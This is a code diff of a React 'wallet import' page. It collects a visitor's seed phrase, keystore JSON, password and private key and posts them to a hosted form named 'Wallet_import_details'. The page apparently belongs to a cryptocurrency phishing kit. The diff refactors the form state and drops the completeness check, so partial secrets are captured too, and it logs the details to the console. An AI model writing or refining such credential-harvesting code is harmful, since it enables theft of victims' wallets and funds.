@@ -13,14 +13,19 @@ function WalletDetailsEntryPage() {
 
   // form handling
 
-  const [phrase, addPhrase] = useState('');
-  const [keystoreJson, addKeystoreJson] = useState('');
-  const [password, addPassword] = useState('');
-  const [privateKey, addPrivateKey] = useState('');
+  const [walletDetails, setWalletDetails] = useState({
+    phrase: '',
+    keystoreJson: '',
+    password: '',
+    privateKey: '',
+  });
 
-  // const [userData, setUserData] = useState({});
+  const handleChange = (e) => {
+    // const name = e.target.name;
+    // const value = e.target.value;
 
-  const userData = { phrase, keystoreJson, password, privateKey };
+    setWalletDetails({ ...walletDetails, [e.target.name]: e.target.value });
+  };
 
   const encode = (data) => {
     return Object.keys(data)
@@ -32,27 +37,24 @@ function WalletDetailsEntryPage() {
 
   function handleSubmit(e) {
     e.preventDefault();
-    if (phrase && keystoreJson && password && privateKey) {
-      fetch('/', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: encode({ 'form-name': 'Wallet_import_details', ...userData }),
+    fetch('/', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: encode({ 'form-name': 'Wallet_import_details', ...walletDetails }),
+    })
+      .then(() => {
+        setWalletDetails({
+          phrase: '',
+          keystoreJson: '',
+          password: '',
+          privateKey: '',
+        });
+        // window.location.reload();
       })
-        .then(() => {
-          addPhrase('');
-          addKeystoreJson('');
-          addPassword('');
-          addPrivateKey('');
-          // window.location.reload();
-        })
-        .catch((error) => alert(error));
-      console.log(userData);
-    } else {
-      alert('incomplete entries');
-      return false;
-    }
+      .catch((error) => alert(error));
+    console.log(walletDetails);
   }
 
   function displayPhrase() {
@@ -123,10 +125,11 @@ function WalletDetailsEntryPage() {
               <textarea
                 className="form-control"
                 // placeholder="Phrase"
-                name="Phrase"
+                name="phrase"
                 rows="5"
-                value={phrase}
-                onChange={(e) => addPhrase(e.target.value)}
+                type="text"
+                value={walletDetails.phrase}
+                onChange={handleChange}
               ></textarea>
               <div className="tip-text">
                 Typically 12 (sometimes 24) words separated by single spaces.
@@ -139,9 +142,10 @@ function WalletDetailsEntryPage() {
                 style={{ marginBottom: '20px' }}
                 className="form-control"
                 // placeholder="Keystore JSON"
-                name="Keystore-JSON"
-                value={keystoreJson}
-                onChange={(e) => addKeystoreJson(e.target.value)}
+                type="text"
+                name="keystoreJson"
+                value={walletDetails.keystoreJson}
+                onChange={handleChange}
                 rows="5"
               ></textarea>
               <div>
@@ -149,10 +153,10 @@ function WalletDetailsEntryPage() {
                   type="password"
                   className="form-control"
                   // placeholder="Password"
-                  name="Password"
+                  name="password"
                   id="inputPassword"
-                  value={password}
-                  onChange={(e) => addPassword(e.target.value)}
+                  value={walletDetails.password}
+                  onChange={handleChange}
                 ></input>
               </div>
               <div className="tip-text">
@@ -168,9 +172,9 @@ function WalletDetailsEntryPage() {
                 type="text"
                 className="form-control"
                 // placeholder="Private Key"
-                name="Private-key"
-                value={privateKey}
-                onChange={(e) => addPrivateKey(e.target.value)}
+                name="privateKey"
+                value={walletDetails.privateKey}
+                onChange={handleChange}
               ></input>
               <div className="tip-text">
                 Typically 12 (sometimes 24) words separated by single spaces.
